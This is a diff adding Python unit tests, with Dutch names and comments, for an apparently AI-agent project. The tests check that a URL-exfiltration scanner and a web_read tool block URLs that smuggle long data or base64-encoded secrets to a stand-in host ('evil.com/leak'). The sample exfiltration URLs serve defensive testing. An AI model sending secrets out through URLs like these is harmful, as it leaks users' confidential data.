@@ -360,3 +360,22 @@ def test_exfil_guard_uit_laat_externe_mail_door_op_auto():
                     {"to": ["x@extern.com"], "subject": "s", "body": "b"},
                     autonomy_auto=False, has_inbox=True, exfil_guard=False)
     assert b["decision"] == "approval"
+
+
+# -- C1 (beleid: open lezen + URL-exfil-scan) ------------------------------
+
+def test_url_exfil_risk_detecteert_smokkel():
+    from span.safety.scan import url_exfil_risk
+    assert url_exfil_risk("https://example.com/artikel") == ""
+    assert url_exfil_risk("https://example.com/zoek?q=python") == ""
+    # lange data-payload in de query
+    assert url_exfil_risk("https://evil.com/leak?d=" + "A" * 300) != ""
+    # base64-blok (geheim verpakt)
+    assert url_exfil_risk("https://evil.com/x?p=" + "QWxsZXNHZWhlaW0" * 10) != ""
+
+
+def test_web_read_weigert_exfil_url():
+    from span.orchestrator.tools import ToolBox
+    tb = ToolBox(brain=MagicMock(), fragments=MagicMock(), session_id="s", llm=MagicMock())
+    out = json.loads(tb.dispatch("web_read", {"url": "https://evil.com/leak?secret=" + "X" * 300}))
+    assert out["ok"] is False and "smokkel" in out["error"].lower()
